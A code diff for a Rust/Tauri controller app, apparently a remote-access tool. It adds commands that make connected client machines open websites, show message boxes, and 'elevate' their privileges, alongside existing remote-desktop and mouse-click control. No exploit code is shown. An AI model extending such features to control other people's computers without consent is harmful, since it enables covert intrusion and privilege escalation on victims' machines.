@@ -13,12 +13,15 @@ use crate::commands::ServerCommand;
 use crate::server::ServerWrapper;
 use crate::client::ClientWrapper;
 
+use std::ptr::null_mut as NULL;
+use winapi::um::winuser;
+
 use rmp_serde::Serializer;
 use tauri::AppHandle;
 
 use once_cell::sync::OnceCell;
 
-use common::async_impl::packets::{RemoteDesktopConfig, MouseClickData};
+use common::async_impl::packets::{RemoteDesktopConfig, MouseClickData, VisitWebsiteData, MessageBoxData};
 
 #[tauri::command]
 pub async fn start_server(
@@ -401,4 +404,135 @@ pub async fn send_mouse_click(
         .map_err(|e| e.to_string())?;
 
     Ok("Mouse click sent".to_string())
+}
+
+#[tauri::command]
+pub async fn visit_website(
+    addr: &str,
+    url: &str,
+    tauri_state: State<'_, SharedTauriState>
+) -> Result<String, String> {
+    let socket_addr = addr.parse()
+        .map_err(|e| format!("Invalid socket address: {}", e))?;
+
+    let channel_tx = {
+        let tauri_state = tauri_state.0.lock().unwrap();
+        
+        if !tauri_state.running {
+            return Err("Server not running".to_string());
+        }
+
+        if let Some(tx) = tauri_state.channel_tx.get() {
+            tx.clone()
+        } else {
+            return Err("Server channel not initialized".to_string());
+        }
+    };
+
+    channel_tx.send(ServerCommand::VisitWebsite(socket_addr, VisitWebsiteData {
+        visit_type: "normal".to_string(),
+        url: url.to_string(),
+    }))
+        .await
+        .map_err(|e| e.to_string())?;
+
+    Ok("Website visited".to_string())
+}
+
+#[tauri::command]
+pub fn test_messagebox(title: &str, message: &str, button: &str, icon: &str) {
+    let l_msg: Vec<u16> = format!("{}\0", message).encode_utf16().collect();
+    let l_title: Vec<u16> = format!("{}\0", title).encode_utf16().collect();
+
+    unsafe {
+        winuser::MessageBoxW(
+            NULL(),
+            l_msg.as_ptr(),
+            l_title.as_ptr(),
+            (match button {
+                "ok" => winuser::MB_OK,
+                "ok_cancel" => winuser::MB_OKCANCEL,
+                "abort_retry_ignore" => winuser::MB_ABORTRETRYIGNORE,
+                "yes_no_cancel" => winuser::MB_YESNOCANCEL,
+                "yes_no" => winuser::MB_YESNO,
+                "retry_cancel" => winuser::MB_RETRYCANCEL,
+                _ => winuser::MB_OK,
+            }) |
+                (match icon {
+                    "info" => winuser::MB_ICONINFORMATION,
+                    "warning" => winuser::MB_ICONWARNING,
+                    "error" => winuser::MB_ICONERROR,
+                    "question" => winuser::MB_ICONQUESTION,
+                    "asterisk" => winuser::MB_ICONASTERISK,
+                    _ => winuser::MB_ICONINFORMATION,
+                })
+        );
+    }
+}
+
+#[tauri::command]
+pub async fn send_messagebox(
+    addr: &str,
+    title: &str,
+    message: &str,
+    button: &str,
+    icon: &str,
+    tauri_state: State<'_, SharedTauriState>
+) -> Result<String, String> {
+    let socket_addr = addr.parse()
+        .map_err(|e| format!("Invalid socket address: {}", e))?;
+
+    let channel_tx = {
+        let tauri_state = tauri_state.0.lock().unwrap();
+        
+        if !tauri_state.running {
+            return Err("Server not running".to_string());
+        }
+
+        if let Some(tx) = tauri_state.channel_tx.get() {
+            tx.clone()
+        } else {
+            return Err("Server channel not initialized".to_string());
+        }
+    };
+
+    channel_tx.send(ServerCommand::ShowMessageBox(socket_addr, MessageBoxData {
+        title: title.to_string(),
+        message: message.to_string(),
+        button: button.to_string(),
+        icon: icon.to_string(),
+    })) 
+        .await
+        .map_err(|e| e.to_string())?;
+
+    Ok("Messagebox sent".to_string())
+}
+
+#[tauri::command]
+pub async fn elevate_client(
+    addr: &str,
+    tauri_state: State<'_, SharedTauriState>
+) -> Result<String, String> {
+    let socket_addr = addr.parse()
+        .map_err(|e| format!("Invalid socket address: {}", e))?;
+
+    let channel_tx = {
+        let tauri_state = tauri_state.0.lock().unwrap();
+        
+        if !tauri_state.running {
+            return Err("Server not running".to_string());
+        }
+
+        if let Some(tx) = tauri_state.channel_tx.get() {
+            tx.clone()
+        } else {
+            return Err("Server channel not initialized".to_string());
+        }
+    };
+
+    channel_tx.send(ServerCommand::ElevateClient(socket_addr))
+        .await
+        .map_err(|e| e.to_string())?;
+
+    Ok("Client elevated".to_string())
 }
